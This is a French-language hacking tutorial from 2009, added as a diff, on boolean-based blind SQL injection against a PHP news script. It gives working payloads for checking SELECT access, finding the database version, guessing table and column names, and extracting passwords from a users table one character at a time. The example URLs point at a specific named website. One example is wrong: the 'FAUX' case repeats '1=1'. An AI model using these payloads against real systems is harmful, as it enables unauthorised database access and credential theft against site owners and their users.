@@ -1,0 +1,111 @@
+/*
+
+[FRANCAIS] Blind SQL Injection
+
+Discovered by : MizoZ
+Contact : mizoz@9.cn
+Team : EvilWay
+
+Date : July 29 2009
+
+Greetings : Moudi , Zuka, All friends
+
+*/
+----------------------------------------------
+
+( SOMAIRE )
+
+0x01 : C'est quoi une SQL injection
+0x02 : Comment sa marche la Blind SQL Injection
+0x03 : Verifier la selection
+0x04 : Trouver la version SQL et trouver les noms des tables et champs
+0x05 : Extraire les informations
+
+----------------------------------------------
+
+0x01 : C'est quoi une SQL Injection
+
+
+Une injection SQL est un type d'exploitation d'une faille de securite d'une application interagissant avec une base de donnees,
+en injectant une requ¨ºte SQL et pouvant compromettre sa s¨¦curit¨¦ en lisant des informations de la base de donnees .
+
+----------------------------------------------
+
+0x02 : Comment sa marche la Blind SQL Injection
+
+On a un script PHP qui fait voir une news , alors sa requete va etre comme ceci : "SELECT * FROM news WHERE id=".$_GET['id']." .
+pour voir la 2eme news on va executer script.php?id=2 , si je met  script.php?id=1 + 1 , j'aurai le meme resultat car 1 + 1 = 2
+, mais si je fait script.php?id=2 and 1=2 , alors la requete deviendrai "SELECT * FROM news WHERE id=2 and 1 = 2" , sa veux dire
+la requete ne va pas s'executer car 1 != 2 , et si on fait script.php?id=2 and 1=1 , la requete va s'executer normalement . C'est
+sa la logique du Blind SQL Injection VRAI ou FAUX , on travaillera tous le temps avec and .
+
+EXEMPLE :
+http://nuclear-coffee.com/fr/news.php?ID=31+and+1=1-- VRAI
+http://nuclear-coffee.com/fr/news.php?ID=31+and+1=1-- FAUX
+
+----------------------------------------------
+
+0x03 : Verifier la selection
+
+Pour voir les donnees biensur il faut utiliser SELECT , alors il faut verifier si on peu l'utiliser , pour verifier on utilise
+"and (select 1)=1" , vous allez dire pourquoi , bah quand la selection marche on aura 1=1 alors c'est VRAI ce qui fait la
+selection et aussi VRAI et si sa marche pas alors c'est FAUX .
+
+EXEMPLE :
+http://nuclear-coffee.com/fr/news.php?ID=31+and+(select 1)=1-- VRAI
+
+----------------------------------------------
+
+0x04 : Trouver la version SQL et trouver les noms des tables et champs
+
+Trouver la version SQL c le meme concept que verifier la selection , mais la on va mettre @@version a la place de selectionner 1
+et aussi on va verifie si sa egale 3 , 4 ou 5 ou n'importe quel version SQL meme 2 ce qui fait on a : "and (select @@version)=5 ,
+si c'est VRAI alors la version SQL c'est 5 , ou bien "and (select @@version)=4" si c'est VRAI alors la version SQL c'est 4 , et
+comme sa .
+
+EXEMPLE :
+http://nuclear-coffee.com/fr/news.php?ID=31+and+(select @@version)=5-- VRAI
+
+Pour trouver les noms des tables et champs , on peux extraire les donnees de la table "tables" de la base de donnee 
+information_schema mais sa c'est apres . La on va utiliser la selection de 1 depuis la table et on limite le resultat a 1 seul
+resultat ce qui nous donne : and+(select 1 from users limit 0,1)=1-- , si c'est VRAI alors la table users existe , et cette
+technique c'est pour deviner les noms des tables .
+
+Pour les noms des champs c'est le meme truc mais a la place de 1 on va utiliser la fonction substring et la function concat : 
+substring(concat(1,NOMDUCOLUMN),1,1) ce qui fait on a : and+(select substring(concat(1,NOMDUCOLUMN),1,1) from NOMDELATABLE limit 0,1)=1--
+
+----------------------------------------------
+
+0x05 : Extraire les informations
+
+C'est la partie la plus dur du tuto . Bah on  travaille toujours avec le VRAI ou FAUX alors comment on va avoir des donnees depuis
+le VRAI ou FAUX . L'idee c'est simple on va extraire les donnees caractere par caractere , et pour avoir un caractere en numerique
+on va le convertir en ascii par la fonction ascii() . et on va utiliser la fonction substring . passant a la pratique  :) 
+
+and ascii(substring((SELECT password from users limit 0,1),1,1))=0
+
+dans lexemple dessus , on va extraire le champ password depuis la table users , on a choisi le premier caractere par substring ,
+et on la convertit en ascii . mais = 0 c'est quoi ??? imaginons que le mdp c'est "cekoi" le premier caractere c'est "c" , dans
+lexemple on verifie si le ascii de "c" = 0 , c'est faux biensur car c pas 0 , mais nous on sais pas que le pass debute par "c"
+alors on va chercher , on peu utiliser < ou > pour trouver l'acsii .
+
+and ascii(substring((SELECT password from users limit 0,1),1,1))>0 VRAI alors en augmente
+and ascii(substring((SELECT password from users limit 0,1),1,1))>30 VRAI AUSSI on augmente une autre fois
+and ascii(substring((SELECT password from users limit 0,1),1,1))>100 FAUX alors on decend .
+and ascii(substring((SELECT password from users limit 0,1),1,1))<95 FAUX alors c entre 95 et 100
+and ascii(substring((SELECT password from users limit 0,1),1,1))>98 VRAI alors c entre 98 et 100 BAH C'est 99
+and ascii(substring((SELECT password from users limit 0,1),1,1))=99 VRAI alors le premier caractere est "c"
+
+pour passer au 2eme carac on remplace ,1,1 a ,2,1 and ascii(substring((SELECT password from users limit 0,1),2,1))
+
+et on fait la meme chose , et en continu comme a ce que un caractere nous donne <0 VRAI  :) 
+
+
+----------------------------------------------
+
+Si quelqu'un n'a pas pije quelque chose , MP moi sur mizozx@gmail.com ou bien mizoz@9.cn
+
+PEACE & LOVE MIZOZ WAS HERE
+
+
+
